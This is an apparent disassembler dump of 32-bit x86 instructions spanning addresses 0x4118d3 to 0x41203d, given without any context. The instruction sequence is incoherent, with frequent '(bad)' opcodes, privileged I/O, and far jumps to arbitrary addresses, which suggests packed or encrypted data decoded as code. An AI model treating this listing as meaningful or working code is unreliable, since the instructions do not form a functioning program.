  4118d3:	int    0xec
  4118d5:	(bad)  
  4118d7:	pop    ecx
  4118d8:	sbb    BYTE PTR [edx],bh
  4118da:	loop   0x411879
  4118dc:	add    al,0x6f
  4118de:	cli    
  4118df:	mov    eax,0xbecba73e
  4118e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118e5:	jp     0x411867
  4118e7:	stc    
  4118e8:	mov    al,0x36
  4118ea:	cdq    
  4118eb:	mov    edx,0xbdc4e2f7
  4118f0:	shr    BYTE PTR [ebp+0x78],cl
  4118f3:	sub    BYTE PTR [edx+0x57],al
  4118f6:	clc    
  4118f7:	sub    eax,0xff68bfd0
  4118fc:	cmp    BYTE PTR [edx+0x1d],ah
  4118ff:	out    dx,al
  411900:	lods   al,BYTE PTR ds:[esi]
  411901:	outs   dx,DWORD PTR ds:[esi]
  411902:	js     0x4118cb
  411904:	out    0xa8,al
  411906:	xchg   ebx,eax
  411907:	aam    0x2b
  411909:	mov    ecx,0xc0a19c50
  41190e:	in     eax,dx
  41190f:	mov    bh,0xda
  411911:	and    BYTE PTR [edx],dh
  411913:	jg     0x411941
  411915:	lock imul al
  411918:	in     eax,dx
  411919:	repz cmp al,cl
  41191c:	mov    edx,DWORD PTR [eax-0x11]
  41191f:	xor    BYTE PTR [ecx+0x2d],0xa6
  411923:	inc    edi
  411924:	ret    0x977b
  411927:	cmp    DWORD PTR [ebx],ebp
  411929:	icebp  
  41192a:	add    ecx,0xf2f121e6
  411930:	sub    eax,DWORD PTR [edi-0x58]
  411933:	lea    edi,[edi-0x6b220c83]
  411939:	add    BYTE PTR [esi+ecx*8-0x13],ah
  41193d:	sub    ebp,esi
  41193f:	jge    0x411913
  411941:	adc    eax,0x87326b3a
  411946:	fsubr  DWORD PTR [edi]
  411948:	jb     0x4118f1
  41194a:	es mov bl,0xd3
  41194d:	or     eax,0xc480cf02
  411952:	push   0x8d42dc67
  411957:	inc    eax
  411958:	(bad)  
  411959:	fdiv   QWORD PTR [ebx-0x611458ed]
  41195f:	stos   DWORD PTR es:[edi],eax
  411960:	ja     0x411940
  411962:	xrelease xchg BYTE PTR [edx+0xa],bl
  411966:	(bad)  
  411967:	in     al,dx
  411968:	repnz or dh,BYTE PTR [ebx-0xb98391e]
  41196f:	in     eax,0x41
  411971:	sub    ecx,DWORD PTR [eax+0x5a5c74f5]
  411977:	jl     0x4119b3
  411979:	(bad)  
  41197a:	into   
  41197b:	(bad)  
  41197c:	stos   DWORD PTR es:[edi],eax
  41197d:	inc    ebp
  41197e:	popa   
  41197f:	outs   dx,BYTE PTR ds:[esi]
  411980:	add    eax,0x81a42724
  411985:	jmp    0x75cc:0x6bc01f52
  41198c:	push   ebp
  41198d:	pop    es
  41198e:	and    eax,0xd367164e
  411993:	cdq    
  411994:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411995:	mov    ebx,0x4438a45d
  41199a:	test   DWORD PTR [esi+0x3d],ebp
  41199d:	lea    ebp,[esi]
  41199f:	jge    0x4119fd
  4119a1:	xor    ecx,esi
  4119a3:	sbb    bl,ch
  4119a5:	sub    al,0x43
  4119a7:	lea    ebx,[ecx]
  4119a9:	pusha  
  4119aa:	jmp    0x28e6:0x2965b047
  4119b1:	ds xor eax,0x7be5f7a2
  4119b7:	pusha  
  4119b8:	(bad)  
  4119b9:	adc    DWORD PTR [esi+0x2f],esi
  4119bc:	test   BYTE PTR [eax],dh
  4119be:	rol    ah,1
  4119c0:	(bad)  
  4119c1:	fsubr  st,st(5)
  4119c3:	adc    esi,DWORD PTR [esi+0x6a173667]
  4119c9:	pusha  
  4119ca:	test   DWORD PTR [esi+0x7d0bf674],esi
  4119d0:	and    eax,0x3fa9d3cb
  4119d5:	pop    esi
  4119d6:	sub    eax,0xbf2ee606
  4119db:	or     bh,BYTE PTR [eax]
  4119dd:	fiadd  DWORD PTR [esp+ebp*1]
  4119e0:	dec    edi
  4119e1:	jg     0x411983
  4119e3:	pop    ebx
  4119e4:	pusha  
  4119e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119e6:	or     DWORD PTR [edi-0x70],esp
  4119e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119ea:	fiadd  WORD PTR [ebx-0x2183b709]
  4119f0:	stc    
  4119f1:	ins    BYTE PTR es:[edi],dx
  4119f2:	fnstcw WORD PTR [esi]
  4119f4:	mov    edi,0xae9ed622
  4119f9:	push   0x8ff0a5c4
  4119fe:	jae    0x411998
  411a00:	xchg   ebx,eax
  411a01:	int    0xda
  411a03:	in     eax,0x84
  411a05:	push   ecx
  411a06:	out    dx,al
  411a07:	cli    
  411a08:	out    0x77,al
  411a0a:	bnd jp 0x4119ce
  411a0d:	inc    ebx
  411a0e:	(bad)  
  411a0f:	addr16 xor ebp,esp
  411a12:	mov    esp,0x74b4b2c0
  411a17:	in     eax,0x88
  411a19:	mov    edx,0xbc04b1cb
  411a1e:	ficomp WORD PTR [ebp-0x14991f44]
  411a24:	or     BYTE PTR [eax-0x6fb0c8e9],dh
  411a2a:	cs gs aad 0xfb
  411a2e:	pop    ds
  411a2f:	mov    bl,0xc4
  411a31:	cmp    DWORD PTR [esi-0x31],0x63
  411a35:	in     eax,0x8f
  411a37:	ins    DWORD PTR es:[edi],dx
  411a38:	sub    eax,DWORD PTR ds:0xeb18c0e
  411a3e:	mov    cl,0xfd
  411a40:	xchg   esp,eax
  411a41:	aam    0x56
  411a43:	call   0x33500fcc
  411a48:	add    al,0x3a
  411a4a:	loop   0x411a44
  411a4c:	(bad)  
  411a4d:	xor    dl,BYTE PTR [ebp+0x31]
  411a50:	mov    al,ds:0x5fa2ae70
  411a55:	xchg   esp,eax
  411a56:	loop   0x411a3a
  411a58:	aas    
  411a59:	sub    edx,esp
  411a5b:	scas   eax,DWORD PTR es:[edi]
  411a5c:	ds mov dh,0x1f
  411a5f:	mov    ds:0xa64140af,al
  411a64:	or     ch,bl
  411a66:	jne    0x411ad3
  411a68:	adc    eax,0xedeca92e
  411a6d:	mov    edx,0xeca5a381
  411a72:	jmp    0x411aa0
  411a74:	lods   eax,DWORD PTR ds:[esi]
  411a75:	mov    ch,0x9d
  411a77:	push   ecx
  411a78:	adc    bl,BYTE PTR [ebp-0x17]
  411a7b:	ins    DWORD PTR es:[edi],dx
  411a7c:	inc    ecx
  411a7d:	inc    esi
  411a7e:	stos   DWORD PTR es:[edi],eax
  411a7f:	in     al,dx
  411a80:	cmp    DWORD PTR [edx-0x339eb306],ebp
  411a86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a87:	sbb    dh,0x8d
  411a8a:	adc    edi,DWORD PTR [esi-0x31]
  411a8d:	xchg   ebp,eax
  411a8e:	pop    es
  411a8f:	(bad)  
  411a90:	adc    edi,DWORD PTR [ebp+0x5f]
  411a93:	mov    BYTE PTR [edx],bh
  411a95:	test   al,0xf
  411a97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a98:	jb     0x411a91
  411a9a:	repz cs adc dh,cl
  411a9e:	cmp    ah,dh
  411aa0:	inc    esi
  411aa1:	out    0x71,eax
  411aa3:	sub    esi,ecx
  411aa5:	out    dx,al
  411aa6:	inc    esi
  411aa7:	(bad)  
  411aa8:	sbb    al,0xee
  411aaa:	fisub  DWORD PTR [eax]
  411aac:	ror    BYTE PTR [edi-0x4673ea45],0xac
  411ab3:	daa    
  411ab4:	outs   dx,BYTE PTR ds:[esi]
  411ab5:	les    edx,FWORD PTR [esi]
  411ab7:	les    ebx,FWORD PTR ss:[ebp+eax*2-0x4295e4d5]
  411abf:	jnp    0x411ab1
  411ac1:	push   edx
  411ac2:	outs   dx,BYTE PTR ds:[esi]
  411ac3:	ins    BYTE PTR es:[edi],dx
  411ac4:	pop    edx
  411ac5:	les    ebx,FWORD PTR [esi]
  411ac7:	xchg   esp,eax
  411ac8:	retf   
  411ac9:	jo     0x411a6f
  411acb:	jecxz  0x411ab1
  411acd:	sbb    eax,0x161b38db
  411ad2:	mov    dl,0xa5
  411ad4:	and    al,0xcf
  411ad6:	leave  
  411ad7:	mov    ah,0x36
  411ad9:	or     al,0x4b
  411adb:	jno    0x411ae1
  411add:	ja     0x411b0e
  411adf:	imul   esp,DWORD PTR [ebx+0x183836de],0xffffffa0
  411ae6:	mov    dl,0x17
  411ae8:	jmp    0x4d35ebc9
  411aed:	retf   0x2b38
  411af0:	push   ss
  411af1:	(bad)  
  411af2:	jmp    0x801c85bd
  411af7:	push   eax
  411af8:	adc    dl,BYTE PTR [ebp-0x4e]
  411afb:	dec    esp
  411afc:	mov    esp,0xdf63bb8e
  411b01:	cmp    eax,0xf0b35abd
  411b06:	inc    ecx
  411b07:	or     BYTE PTR [esi+eax*2+0x1e],ch
  411b0b:	mov    bh,0x86
  411b0d:	std    
  411b0e:	jne    0x411b7e
  411b10:	push   ebx
  411b11:	rcr    BYTE PTR [ebp+ecx*2+0x68],0xa5
  411b16:	push   eax
  411b17:	rol    DWORD PTR [ecx],0x5a
  411b1a:	xor    ah,BYTE PTR [ecx+0x1f745882]
  411b20:	ja     0x411aeb
  411b22:	ins    DWORD PTR es:[edi],dx
  411b23:	stc    
  411b24:	xor    DWORD PTR [edi+0x2baad179],eax
  411b2a:	fbstp  TBYTE PTR [edx-0x65d80608]
  411b30:	sub    cl,BYTE PTR [edx+0x77]
  411b33:	(bad)  
  411b34:	mov    ecx,0x2e00faef
  411b39:	xchg   esi,eax
  411b3a:	mov    ch,0x7d
  411b3c:	ss je  0x411ba1
  411b3f:	and    eax,0xff190496
  411b44:	dec    esp
  411b45:	sbb    BYTE PTR [edi-0x408f9ac9],ah
  411b4b:	dec    ebp
  411b4c:	mov    eax,ds:0x3bf5edff
  411b51:	arpl   WORD PTR [ebp+0x79],ax
  411b54:	sub    bl,BYTE PTR [ebx+0x71]
  411b57:	pop    ecx
  411b58:	cwde   
  411b59:	out    0x3a,eax
  411b5b:	retf   0xe409
  411b5e:	out    0xc5,al
  411b60:	aas    
  411b61:	test   eax,0x70748043
  411b66:	fsubr  DWORD PTR [ebx+0x5e480f59]
  411b6c:	cmova  esi,DWORD PTR [esi+0x2b1073ae]
  411b73:	mov    esi,0xda7481b2
  411b78:	mov    cl,0xe1
  411b7a:	out    0x82,al
  411b7c:	ficom  WORD PTR [ebp-0x27287ac5]
  411b82:	mov    WORD PTR [edi+0x1da55985],ss
  411b88:	jnp    0x411c06
  411b8a:	pop    ebx
  411b8b:	cmp    eax,0x305cf0b5
  411b90:	aaa    
  411b91:	retf   0x6f61
  411b94:	xor    al,0x7e
  411b96:	outs   dx,DWORD PTR ds:[esi]
  411b97:	pop    ss
  411b98:	out    dx,al
  411b99:	mov    dl,0xe5
  411b9b:	adc    BYTE PTR [ebx],0x7c
  411b9e:	lods   al,BYTE PTR ds:[esi]
  411b9f:	ror    DWORD PTR [ebx],cl
  411ba1:	(bad)  [esi+0x21]
  411ba4:	sbb    bh,ch
  411ba6:	mov    esi,0xa433a78e
  411bab:	mov    ds:0x23d0f28,eax
  411bb0:	(bad)  
  411bb1:	adc    ebx,DWORD PTR [esi]
  411bb3:	jae    0x411c12
  411bb5:	nop
  411bb6:	mov    bl,0xdf
  411bb8:	push   ss
  411bb9:	jmp    0x411be9
  411bbb:	cmp    ch,BYTE PTR [edx]
  411bbd:	pop    esp
  411bbe:	arpl   WORD PTR [edi-0x52],bx
  411bc1:	shr    BYTE PTR [edi*4-0x75d60e3e],cl
  411bc8:	nop
  411bc9:	in     eax,dx
  411bca:	add    BYTE PTR [edx-0x33],dl
  411bcd:	pushf  
  411bce:	test   DWORD PTR ds:[ebp+0x50],esp
  411bd2:	ret    
  411bd3:	sub    al,0x4d
  411bd5:	nop
  411bd6:	pop    eax
  411bd7:	xchg   ebp,eax
  411bd8:	retf   
  411bd9:	jbe    0x411bbc
  411bdb:	es adc ebp,ebx
  411bde:	push   ebx
  411bdf:	dec    eax
  411be0:	add    BYTE PTR [ebp+edx*4-0x2a],0xac
  411be5:	xor    al,0x8d
  411be7:	push   es
  411be8:	(bad)  
  411be9:	pushf  
  411bea:	mov    edx,0x4bf2de95
  411bef:	lods   al,BYTE PTR ds:[esi]
  411bf0:	push   ss
  411bf1:	mov    eax,ds:0x22b8f437
  411bf6:	inc    edx
  411bf7:	shl    DWORD PTR [edi+0x6a054467],1
  411bfd:	nop
  411bfe:	xor    eax,0xa882cfaf
  411c03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c04:	out    dx,eax
  411c05:	push   edx
  411c06:	dec    ebx
  411c07:	or     al,0x23
  411c09:	aaa    
  411c0a:	jmp    0x411c69
  411c0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c0e:	adc    ebp,DWORD PTR [ebp+0x70]
  411c11:	in     al,0x88
  411c13:	sub    BYTE PTR [ecx],cl
  411c15:	shr    eax,cl
  411c17:	pop    edi
  411c18:	mov    al,0xcf
  411c1a:	pushf  
  411c1b:	jb     0x411c98
  411c1d:	fwait
  411c1e:	mov    ebx,0xddbc5a2d
  411c23:	dec    ebp
  411c24:	push   ebp
  411c25:	stos   BYTE PTR es:[edi],al
  411c26:	sub    bl,BYTE PTR [ebx+eax*4-0x43]
  411c2a:	ja     0x411c06
  411c2c:	mov    bl,0xab
  411c2e:	xchg   DWORD PTR [ecx+ecx*4-0x2b474a7],esi
  411c35:	in     al,0xaa
  411c37:	dec    eax
  411c38:	add    eax,0x6d9513b4
  411c3d:	sub    dh,cl
  411c3f:	(bad)  
  411c40:	repz test eax,0x9fc31f98
  411c46:	neg    DWORD PTR [ecx]
  411c48:	std    
  411c49:	add    ebx,ecx
  411c4b:	or     al,0xbf
  411c4d:	pusha  
  411c4e:	repnz stos DWORD PTR es:[edi],eax
  411c50:	daa    
  411c51:	rol    DWORD PTR [ecx],cl
  411c53:	outs   dx,BYTE PTR ds:[esi]
  411c54:	or     BYTE PTR [ebx-0x1feecad5],0x66
  411c5b:	push   edx
  411c5c:	not    BYTE PTR [edi+0x5e51f222]
  411c62:	cmp    DWORD PTR [esp+edx*1],ecx
  411c65:	xor    eax,0xf9b62df4
  411c6a:	(bad)  
  411c6c:	test   BYTE PTR cs:[bx+0x1e52],dh
  411c72:	popf   
  411c73:	inc    ebp
  411c74:	stos   BYTE PTR es:[edi],al
  411c75:	loope  0x411bfe
  411c77:	in     eax,dx
  411c78:	(bad)  
  411c79:	rol    DWORD PTR [bx+si-0x61],1
  411c7d:	das    
  411c7e:	fdivr  st,st(2)
  411c80:	(bad)  
  411c81:	and    ebp,DWORD PTR [ecx]
  411c83:	or     edi,esi
  411c85:	jge    0x411cf5
  411c87:	lods   al,BYTE PTR ds:[esi]
  411c88:	rcr    DWORD PTR [eax],1
  411c8a:	jle    0x411c85
  411c8c:	rcl    BYTE PTR [edx-0x1a4cc1c6],cl
  411c92:	mov    esp,0x66f24290
  411c97:	les    esi,FWORD PTR [edi]
  411c99:	push   cs
  411c9a:	jae    0x411c87
  411c9c:	out    dx,al
  411c9d:	jnp    0x411cfe
  411c9f:	into   
  411ca0:	add    al,0x99
  411ca2:	adc    al,0x99
  411ca4:	cmp    BYTE PTR [ecx],bl
  411ca6:	lock mov ecx,0xdbc48aaf
  411cac:	sbb    dl,BYTE PTR [edx]
  411cae:	mov    al,ds:0xe7c9e4cb
  411cb3:	pop    esp
  411cb4:	dec    esi
  411cb5:	pop    esp
  411cb6:	mov    al,0x7
  411cb8:	jl     0x411c78
  411cba:	lods   eax,DWORD PTR ds:[esi]
  411cbb:	push   es
  411cbc:	adc    eax,0x7b3e86ee
  411cc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cc2:	(bad)  
  411cc3:	ds xchg esi,eax
  411cc5:	lea    ebp,[esi+ebx*8+0x1419bf0d]
  411ccc:	mov    dl,0xf
  411cce:	dec    edx
  411ccf:	push   edx
  411cd0:	pop    es
  411cd1:	gs push cs
  411cd3:	mov    DWORD PTR [esi-0x68],0x3f45b139
  411cda:	fiadd  DWORD PTR [edi]
  411cdc:	jns    0x411c64
  411cde:	jne    0x411d57
  411ce0:	xchg   edi,eax
  411ce1:	lods   al,BYTE PTR ds:[esi]
  411ce2:	push   esp
  411ce3:	cli    
  411ce4:	sbb    eax,0xaa39ecbc
  411ce9:	mov    al,ds:0x1b376985
  411cee:	dec    ebp
  411cef:	imul   edi,DWORD PTR [eax],0xffffffd6
  411cf2:	retf   0x8d29
  411cf5:	retf   0x8a0e
  411cf8:	jae    0x411d32
  411cfa:	hlt    
  411cfb:	pop    ebx
  411cfc:	nop
  411cfd:	jbe    0x411ca3
  411cff:	sbb    eax,0x525d1a59
  411d04:	pop    edi
  411d05:	pusha  
  411d06:	(bad)  
  411d07:	sti    
  411d08:	pop    esp
  411d09:	mov    al,0xb8
  411d0b:	mov    ebx,0x68373977
  411d10:	sub    al,BYTE PTR [esi-0x691225f0]
  411d16:	cmp    dh,BYTE PTR [eax]
  411d18:	jnp    0x411cc4
  411d1a:	xchg   BYTE PTR [ebx],cl
  411d1c:	mov    esi,0xf4fceba7
  411d21:	int    0x7b
  411d23:	fiadd  WORD PTR [eax]
  411d25:	mov    ebp,0xd08c7802
  411d2a:	test   eax,0x9e6a5329
  411d2f:	mov    edx,ss
  411d31:	sbb    ebx,DWORD PTR [ecx-0x55fbd50a]
  411d37:	pop    ds
  411d38:	push   cs
  411d39:	mov    edx,0x3224e358
  411d3e:	es xchg edx,eax
  411d40:	shl    DWORD PTR [esi],0x2f
  411d43:	add    edi,DWORD PTR [ecx-0x67b50174]
  411d49:	push   0x3b091cd0
  411d4e:	cmp    BYTE PTR [edi+0x16],bh
  411d51:	das    
  411d52:	and    BYTE PTR [ecx-0x5f0e06db],ah
  411d58:	jmp    0x1ed4:0xb5cacebc
  411d5f:	call   0x265e:0x3ecd2c83
  411d66:	jnp    0x411cf9
  411d68:	or     edi,ecx
  411d6a:	cmp    al,BYTE PTR [edi-0x19758793]
  411d70:	cs daa 
  411d72:	out    dx,al
  411d73:	jecxz  0x411def
  411d75:	xlat   BYTE PTR ds:[ebx]
  411d76:	ror    dh,cl
  411d78:	mov    ah,0xa9
  411d7a:	call   0x298b23d0
  411d7f:	fisub  DWORD PTR [edx]
  411d81:	das    
  411d82:	test   al,0xb7
  411d84:	in     eax,dx
  411d85:	sbb    BYTE PTR [ebp+0x1],dh
  411d88:	retf   
  411d89:	inc    DWORD PTR [edi-0x50d8f43a]
  411d8f:	out    dx,eax
  411d90:	sti    
  411d91:	adc    DWORD PTR [ebx],esp
  411d93:	dec    ecx
  411d94:	call   FWORD PTR [eax-0x370bce9]
  411d9a:	inc    ebp
  411d9b:	retf   
  411d9c:	call   0x5382:0xd63224d4
  411da3:	icebp  
  411da4:	ins    DWORD PTR es:[edi],dx
  411da5:	imul   DWORD PTR [eax]
  411da7:	jne    0x411e14
  411da9:	clc    
  411daa:	pop    edx
  411dab:	icebp  
  411dac:	(bad)  
  411dad:	cmp    bh,cl
  411daf:	std    
  411db0:	leave  
  411db1:	in     al,dx
  411db2:	dec    ebp
  411db3:	pop    edi
  411db4:	int    0x47
  411db6:	sti    
  411db7:	pop    edi
  411db8:	cwde   
  411db9:	hlt    
  411dba:	stos   BYTE PTR es:[edi],al
  411dbb:	dec    edx
  411dbc:	cmp    al,0x38
  411dbe:	xchg   esi,eax
  411dbf:	repnz inc ecx
  411dc1:	dec    eax
  411dc2:	outs   dx,BYTE PTR ds:[esi]
  411dc3:	retf   
  411dc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411dc5:	sub    DWORD PTR [ebp+0x1d],edi
  411dc8:	icebp  
  411dc9:	pop    esp
  411dca:	bound  ebx,QWORD PTR [ebx-0x10e6c99c]
  411dd0:	(bad)  
  411dd1:	or     ah,BYTE PTR cs:[edx+0x4c73b6ec]
  411dd8:	(bad)  
  411dd9:	xor    edi,edi
  411ddb:	mov    ds:0x276b6f6f,eax
  411de0:	sbb    al,0x59
  411de2:	ds jmp 0x2895250f
  411de8:	xchg   ecx,eax
  411de9:	cmp    ch,BYTE PTR [edi]
  411deb:	pop    esi
  411dec:	lahf   
  411ded:	mov    ch,0xcb
  411def:	add    al,ch
  411df1:	lods   eax,DWORD PTR ds:[esi]
  411df2:	pop    ss
  411df3:	mov    ebx,esi
  411df5:	pop    ds
  411df6:	icebp  
  411df7:	loope  0x411e5e
  411df9:	popa   
  411dfa:	mov    BYTE PTR [ecx-0x76],ch
  411dfd:	fisubr WORD PTR [edx]
  411dff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e00:	push   0x13
  411e02:	fdivr  DWORD PTR [ecx+0x26]
  411e05:	jo     0x411e49
  411e07:	shr    DWORD PTR [edi],cl
  411e09:	sub    al,0xe9
  411e0b:	scas   eax,DWORD PTR es:[edi]
  411e0c:	inc    esp
  411e0d:	cmp    BYTE PTR [eax+0x32],ch
  411e10:	jo     0x411d96
  411e12:	lahf   
  411e13:	lock pop ecx
  411e15:	mov    ecx,0xe3729aae
  411e1a:	scas   al,BYTE PTR es:[edi]
  411e1b:	retf   
  411e1c:	or     al,0xcc
  411e1e:	fadd   QWORD PTR [ebx-0x5f]
  411e21:	inc    edi
  411e22:	lea    edi,[eiz*8+0x2a71044]
  411e29:	dec    ebx
  411e2a:	inc    edx
  411e2b:	iret   
  411e2c:	arpl   WORD PTR ds:0x8fc61824,si
  411e32:	jnp    0x411e44
  411e34:	fxch   st(7)
  411e36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e37:	hlt    
  411e38:	or     al,0xdf
  411e3a:	adc    BYTE PTR [eax+0x5801160],0xb4
  411e41:	ja     0x411e3b
  411e43:	dec    edx
  411e44:	inc    ebp
  411e45:	cli    
  411e46:	push   ebx
  411e47:	mov    ebx,0xf213a96b
  411e4c:	mov    ecx,0x4c6ec2a9
  411e51:	mov    BYTE PTR [edx+ecx*8+0x4f],ch
  411e55:	mov    DWORD PTR [edi-0xb],edx
  411e58:	xor    edx,DWORD PTR [edx-0x2ff25153]
  411e5e:	xchg   ebx,eax
  411e5f:	adc    dh,ah
  411e61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e62:	jno    0x411df2
  411e64:	adc    edx,ecx
  411e66:	or     DWORD PTR [esp+esi*8-0x6b],edx
  411e6a:	aas    
  411e6b:	jp     0x411eb3
  411e6d:	out    dx,al
  411e6e:	xlat   BYTE PTR ds:[ebx]
  411e6f:	xor    esi,edi
  411e71:	(bad)  
  411e73:	mov    ds:0xf2ba8957,al
  411e78:	jp     0x411ebc
  411e7a:	repnz test al,0x53
  411e7d:	push   cs
  411e7e:	(bad)  
  411e7f:	scas   al,BYTE PTR es:[edi]
  411e80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e81:	dec    edx
  411e82:	push   ss
  411e83:	mov    bh,0xd5
  411e85:	add    eax,0xb43749db
  411e8a:	ins    DWORD PTR es:[edi],dx
  411e8b:	mov    fs,edx
  411e8d:	inc    ebp
  411e8e:	mov    dh,0xbf
  411e90:	into   
  411e91:	xor    ah,dh
  411e93:	mov    edi,0x258fe4e7
  411e98:	add    DWORD PTR [ebp-0x80],edi
  411e9b:	mov    ds:0x75cdd86f,eax
  411ea0:	in     al,0xaf
  411ea2:	cmp    DWORD PTR [eax-0x49d11b5a],eax
  411ea8:	xchg   edi,eax
  411ea9:	fcom   st(2)
  411eab:	rcl    dl,cl
  411ead:	std    
  411eae:	js     0x411e80
  411eb0:	mov    al,0x35
  411eb2:	cli    
  411eb3:	pop    eax
  411eb4:	shl    BYTE PTR [ebx],cl
  411eb6:	loopne 0x411eb8
  411eb8:	mov    ebp,0xbef9f51e
  411ebd:	pop    esi
  411ebe:	(bad)  
  411ec0:	pop    edi
  411ec1:	pop    ecx
  411ec2:	mov    bh,0xcc
  411ec4:	mov    dl,0x75
  411ec6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ec7:	jne    0x411e7b
  411ec9:	mov    BYTE PTR [edx+0x64],al
  411ecc:	lods   eax,DWORD PTR ds:[esi]
  411ecd:	cli    
  411ece:	std    
  411ecf:	cld    
  411ed0:	sub    eax,0xd0504174
  411ed5:	sub    dh,BYTE PTR [ebx-0x1]
  411ed8:	dec    edx
  411eda:	icebp  
  411edb:	xchg   ecx,eax
  411edc:	xor    al,0x8d
  411ede:	aas    
  411edf:	loope  0x411ef8
  411ee1:	inc    ebx
  411ee2:	push   es
  411ee3:	pop    ds
  411ee4:	repz pop ss
  411ee6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ee7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ee8:	dec    esp
  411ee9:	int3   
  411eea:	xor    esi,esp
  411eec:	mov    al,ds:0x31f46d97
  411ef1:	cmp    ebp,DWORD PTR [eax-0x2]
  411ef4:	cmp    bl,dl
  411ef6:	sub    DWORD PTR [edi],ebx
  411ef8:	cmp    esp,ecx
  411efa:	enter  0x967f,0x57
  411efe:	pop    es
  411eff:	fdiv   DWORD PTR [ecx]
  411f01:	and    dh,BYTE PTR [eax+0x18cbcf8e]
  411f07:	adc    eax,0x5aa59ec6
  411f0c:	mov    WORD PTR [esi+ecx*1+0x19fbf37f],fs
  411f13:	fadd   DWORD PTR [ebx-0x1e]
  411f16:	aad    0xd6
  411f18:	or     eax,0x5a2f5c02
  411f1d:	xchg   esi,eax
  411f1e:	cmp    al,cl
  411f20:	cmp    BYTE PTR [esi],bh
  411f22:	daa    
  411f23:	rcr    DWORD PTR [ecx],1
  411f25:	in     eax,dx
  411f26:	or     al,BYTE PTR [edx]
  411f28:	cmp    edi,DWORD PTR [edx+0xb3a59a8]
  411f2e:	adc    DWORD PTR [ebp-0x25],edi
  411f31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f32:	ja     0x411f67
  411f34:	int    0xfd
  411f36:	cld    
  411f37:	loopne 0x411f0f
  411f39:	or     eax,0x5f888c52
  411f3e:	xchg   ecx,eax
  411f3f:	cmp    ah,BYTE PTR [edi]
  411f41:	cmc    
  411f42:	fldenv [eax]
  411f44:	out    0x9b,eax
  411f46:	cld    
  411f47:	mov    DWORD PTR [eax],edx
  411f49:	inc    ebp
  411f4a:	(bad)  
  411f4c:	sbb    eax,0x60414dee
  411f51:	mov    eax,ds:0x1790057e
  411f56:	cmp    DWORD PTR [edx-0x1cd8fb8a],eax
  411f5c:	inc    edi
  411f5d:	dec    ebx
  411f5e:	cdq    
  411f5f:	repnz xchg ecx,eax
  411f61:	inc    edx
  411f62:	adc    al,0x1b
  411f64:	shl    BYTE PTR [eax-0x24],0x36
  411f68:	and    BYTE PTR [ecx+0x30c4173c],bh
  411f6e:	bound  esp,QWORD PTR [ebx+ecx*1-0x6feaf2f7]
  411f75:	in     eax,dx
  411f76:	inc    ebx
  411f77:	adc    DWORD PTR ss:[edi+0x78],0xc190bc48
  411f7f:	gs push esp
  411f81:	sahf   
  411f82:	push   eax
  411f83:	call   0xe1936be7
  411f88:	daa    
  411f89:	sub    ah,BYTE PTR [esi-0x415f0457]
  411f8f:	sub    esp,DWORD PTR [ecx+0xbcf1648]
  411f95:	push   ds
  411f96:	dec    ecx
  411f97:	lods   eax,DWORD PTR ds:[esi]
  411f98:	data16 or BYTE PTR [eax-0x538d9694],dh
  411f9f:	pop    edi
  411fa0:	lods   al,BYTE PTR ds:[esi]
  411fa1:	nop
  411fa2:	push   esp
  411fa3:	push   ebx
  411fa4:	or     edx,ecx
  411fa6:	mov    bl,0xb8
  411fa8:	push   ds
  411fa9:	xchg   ebx,eax
  411faa:	ficom  DWORD PTR [esp+edx*4-0x105f2d9f]
  411fb1:	popa   
  411fb2:	jmp    0xb2b71e13
  411fb7:	ss mov dl,0x4d
  411fba:	xor    eax,0x6ee5c669
  411fbf:	pop    ss
  411fc0:	aas    
  411fc1:	sbb    ebp,DWORD PTR [edi]
  411fc3:	mov    al,ds:0x77db8c8e
  411fc8:	or     al,BYTE PTR [esi-0x637aa158]
  411fce:	adc    eax,0x6a489bac
  411fd3:	pop    esi
  411fd4:	leave  
  411fd5:	inc    edi
  411fd6:	jmp    0x775ef67a
  411fdb:	int3   
  411fdc:	es ins BYTE PTR es:[edi],dx
  411fde:	or     al,0x5b
  411fe0:	pop    edx
  411fe1:	enter  0xb615,0x9
  411fe5:	das    
  411fe6:	ins    BYTE PTR es:[edi],dx
  411fe7:	sahf   
  411fe8:	cmovns ecx,DWORD PTR [ecx+0x79]
  411fec:	inc    eax
  411fed:	mov    bh,0x68
  411fef:	xor    DWORD PTR [ebx+eiz*8],ebp
  411ff2:	idiv   DWORD PTR [esi]
  411ff4:	pop    es
  411ff5:	xor    dh,BYTE PTR [esi-0x4bb2ed32]
  411ffb:	xor    DWORD PTR [eax],0x6d696d03
  412001:	imul   esp,DWORD PTR [ecx+0x49],0xfffffff7
  412005:	lds    ebp,FWORD PTR [eax+0x57928467]
  41200b:	push   edx
  41200c:	in     eax,dx
  41200d:	sbb    eax,0x2e90687a
  412012:	and    esi,DWORD PTR [eax+edi*4]
  412015:	jmp    0xcef64c80
  41201a:	stc    
  41201b:	add    bh,BYTE PTR [eax]
  41201d:	mov    dh,0x49
  41201f:	mov    WORD PTR [edi-0x41b39180],fs
  412025:	mov    ecx,DWORD PTR [edx-0x552885a2]
  41202b:	jo     0x411fff
  41202d:	sub    bl,BYTE PTR [esp+edx*8]
  412030:	xor    esi,DWORD PTR [edx]
  412032:	mov    bh,BYTE PTR [edi-0x4f67db99]
  412038:	mov    ebp,0x7e51d1b6
  41203d:	shl    BYTE PTR [esi],1
